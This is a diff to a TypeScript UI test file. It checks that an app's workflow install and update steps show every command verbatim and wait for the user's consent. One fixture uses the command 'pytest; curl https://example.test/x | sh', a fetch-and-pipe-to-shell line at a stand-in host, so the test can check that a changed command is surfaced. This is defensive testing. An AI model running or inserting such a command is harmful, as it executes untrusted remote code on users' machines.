@@ -11,7 +11,12 @@ import {
   renderApp,
   type DaemonState,
 } from "../test/harness";
-import { NO_WORKFLOW_MEANS } from "../data/workflows";
+import { ApiRefusal } from "../data/client";
+import {
+  NO_WORKFLOW_MEANS,
+  type ConsentCommand,
+  type WorkflowConsent,
+} from "../data/workflows";
 
 vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));
 const opener = vi.hoisted(() => ({ openUrl: vi.fn() }));
@@ -21,6 +26,13 @@ vi.mock("../data/client", async (original) => ({
   ...(await original<typeof import("../data/client")>()),
   ...daemon,
 }));
+
+/** Press the button that agrees to the commands on screen, once they have been read. */
+async function agree(name: string) {
+  const button = (await screen.findByRole("button", { name })) as HTMLButtonElement;
+  await waitFor(() => expect(button.disabled).toBe(false));
+  fireEvent.click(button);
+}
 
 /** The Workflows mode, over a daemon holding exactly these facts. */
 async function openWorkflows(overrides: Partial<DaemonState> = {}) {
@@ -80,6 +92,10 @@ describe("the workflows mode", () => {
     // The other version is an upgrade rather than an addition, and the button says which — one
     // workflow per name means "use 1.1" replaces the 1.0 that is working.
     fireEvent.click(screen.getByRole("button", { name: "use 1.1 instead" }));
+    // Not yet: the commands 1.1 runs come first, and the pin waits for somebody to agree to them.
+    await screen.findByRole("group", { name: "Commands in harness 1.1" });
+    expect(state.workflowChanges).toEqual([]);
+    await agree("agree and use 1.1 instead");
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0]).toEqual({
       verb: "install",
@@ -242,11 +258,17 @@ describe("the workflows mode", () => {
    * an ejected copy's edits and "stop using it" takes this project's overrides with the pin; both
    * fired on the first press.
    */
-  it("asks twice before replacing an ejected copy", async () => {
+  it("asks twice before replacing an ejected copy, after showing the commands it brings", async () => {
     const { state } = await openWorkflows({
       workflows: [installedWorkflow({ standing: "ejected", ejected_at: "2026-02-01T00:00:00Z" })],
     });
-    const replace = await screen.findByRole("button", { name: "replace with the library's" });
+    fireEvent.click(await screen.findByRole("button", { name: "replace with the library's" }));
+    await screen.findByRole("group", { name: "Commands in harness 1.0" });
+    expect(state.workflowChanges).toEqual([]);
+
+    const replace = await screen.findByRole("button", {
+      name: "replace — this copy's edits are lost",
+    });
     fireEvent.click(replace);
     expect(state.workflowChanges).toEqual([]);
     // The live region, not the label: both labels are always in the DOM, one of them hidden.
@@ -257,6 +279,8 @@ describe("the workflows mode", () => {
     fireEvent.click(replace);
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0].verb).toBe("update");
+    // And it names the version whose commands were on screen.
+    expect(state.workflowChanges[0].version).toBe("1.0");
   });
 
   it("asks twice before removing the pin, and says the overrides go with it", async () => {
@@ -294,6 +318,7 @@ describe("the workflows mode", () => {
     await renderApp({ initialPath: "/projects/nucleos/workflows" });
 
     fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    await agree("agree and use here");
     expect(await screen.findByText(/nothing was installed: connection refused/)).toBeTruthy();
   });
 
@@ -350,5 +375,165 @@ describe("the workflows mode", () => {
   it("distinguishes a machine with no library from an empty one", async () => {
     await openWorkflows({ library: null });
     expect(await screen.findByText(/no folder for a workflow library/)).toBeTruthy();
+  });
+});
+
+/**
+ * Installing is consenting (slice 10).
+ *
+ * A command node runs a string with no hook and no classifier, so the install and update steps
+ * list every one of them verbatim, and an update says which ones moved. These tests assert the
+ * strings themselves: a count, or a summary, would pass a page that hid the one line that mattered.
+ */
+describe("the install step lists what will run", () => {
+  const consentOf = (overrides: Partial<WorkflowConsent> = {}): WorkflowConsent => ({
+    version: "1.0",
+    baseline: null,
+    commands: [],
+    removed: [],
+    ...overrides,
+  });
+  const command = (overrides: Partial<ConsentCommand> = {}): ConsentCommand => ({
+    node: "test",
+    label: "test",
+    command: "pytest",
+    cwd: null,
+    timeout: null,
+    change: "new",
+    disabled: false,
+    ...overrides,
+  });
+
+  it("shows every command verbatim with its directory before anything is pinned", async () => {
+    const { state } = await openWorkflows({
+      library: [bundle({ version: "1.0" })],
+      workflowConsent: consentOf({
+        commands: [
+          command({ node: "test", command: "pytest -x | tee out.txt", cwd: "backend" }),
+          command({ node: "lint", label: "Lint", command: "ruff check .\nruff format --check ." }),
+        ],
+      }),
+    });
+
+    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
+
+    // The strings, character for character, and the folder each runs in.
+    expect(await panel.findByText("pytest -x | tee out.txt")).toBeTruthy();
+    expect(panel.getByText("in backend")).toBeTruthy();
+    expect(
+      panel.getByText((_, node) => node?.tagName === "PRE" && node.textContent === "ruff check .\nruff format --check ."),
+    ).toBeTruthy();
+    expect(panel.getByText("in the project's folder")).toBeTruthy();
+    expect(panel.getByText(/runs 2 commands in this project/)).toBeTruthy();
+    expect(state.consentAsked).toEqual([{ name: "harness", version: "1.0" }]);
+    // Reading is not agreeing.
+    expect(state.workflowChanges).toEqual([]);
+
+    fireEvent.click(panel.getByRole("button", { name: "agree and use here" }));
+    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
+    expect(state.workflowChanges[0]).toEqual({ verb: "install", name: "harness", version: "1.0" });
+  });
+
+  it("will not agree to a listing it could not read", async () => {
+    const { state } = await openWorkflows({ library: [bundle({ version: "1.0" })] });
+    const answer = daemonFetch(state);
+    daemon.apiFetch.mockImplementation(async (path: string, init?: RequestInit) => {
+      if (path.includes("/consent")) {
+        throw new ApiRefusal(422, "invalid_graph", "line 3: an edge names `nowhere`");
+      }
+      return answer(path, init);
+    });
+
+    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
+    expect(await panel.findByText("invalid_graph")).toBeTruthy();
+    expect(
+      (panel.getByRole("button", { name: "agree and use here" }) as HTMLButtonElement).disabled,
+    ).toBe(true);
+    expect(state.workflowChanges).toEqual([]);
+  });
+
+  it("puts the command an update changed first, with what it used to be", async () => {
+    const { state } = await openWorkflows({
+      library: [bundle({ version: "1.0" }), bundle({ version: "1.0.1", hash: "sha256:bbbb" })],
+      workflows: [installedWorkflow({ version: "1.0", update_available: "1.0.1" })],
+      workflowConsent: consentOf({
+        version: "1.0.1",
+        baseline: "1.0",
+        baseline_source: "library",
+        commands: [
+          command({ node: "lint", command: "ruff check", change: "unchanged" }),
+          command({
+            node: "test",
+            command: "pytest; curl https://example.test/x | sh",
+            change: "changed",
+            previous_command: "pytest",
+          }),
+        ],
+        removed: [{ node: "old", command: "make legacy", cwd: null }],
+      }),
+    });
+
+    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
+    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));
+
+    expect(await panel.findByText("pytest; curl https://example.test/x | sh")).toBeTruthy();
+    // What it used to be, beside it.
+    expect(panel.getByText("pytest")).toBeTruthy();
+    expect(panel.getByText(/Against 1\.0: 1 changed, 1 dropped/)).toBeTruthy();
+    // And a dropped command is listed too.
+    expect(panel.getByText("make legacy")).toBeTruthy();
+    // The changed command is listed before the unchanged one.
+    const items = within(panel.getByRole("list", { name: "Commands" })).getAllByRole("listitem");
+    expect(within(items[0]).getByText("changed")).toBeTruthy();
+    expect(within(items[1]).queryByText("changed")).toBeNull();
+
+    expect(state.workflowChanges).toEqual([]);
+    fireEvent.click(panel.getByRole("button", { name: "agree and update to 1.0.1" }));
+    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
+    expect(state.workflowChanges[0]).toEqual({ verb: "update", name: "harness", version: "1.0.1" });
+  });
+
+  it("says nothing moved when no command differs, and still lists them", async () => {
+    await openWorkflows({
+      library: [bundle({ version: "1.0" }), bundle({ version: "1.0.1", hash: "sha256:bbbb" })],
+      workflows: [installedWorkflow({ version: "1.0", update_available: "1.0.1" })],
+      workflowConsent: consentOf({
+        version: "1.0.1",
+        baseline: "1.0",
+        baseline_source: "library",
+        commands: [command({ command: "pytest", change: "unchanged" })],
+      }),
+    });
+
+    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
+    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));
+    expect(await panel.findByText(/No command differs from what runs now/)).toBeTruthy();
+    expect(panel.getByText("pytest")).toBeTruthy();
+  });
+
+  it("shows the project's own override beside the bundle's string", async () => {
+    await openWorkflows({
+      library: [bundle({ version: "1.0" })],
+      workflowConsent: consentOf({
+        commands: [command({ command: "make test", project_override: "make test-fast" })],
+      }),
+    });
+    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
+    expect(await panel.findByText("make test")).toBeTruthy();
+    expect(panel.getByText("make test-fast")).toBeTruthy();
+  });
+
+  it("closes on Escape and installs nothing", async () => {
+    const { state } = await openWorkflows({ library: [bundle({ version: "1.0" })] });
+    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    const group = await screen.findByRole("group", { name: "Commands in harness 1.0" });
+    fireEvent.keyDown(group, { key: "Escape" });
+    await waitFor(() =>
+      expect(screen.queryByRole("group", { name: "Commands in harness 1.0" })).toBeNull(),
+    );
+    expect(state.workflowChanges).toEqual([]);
   });
 });
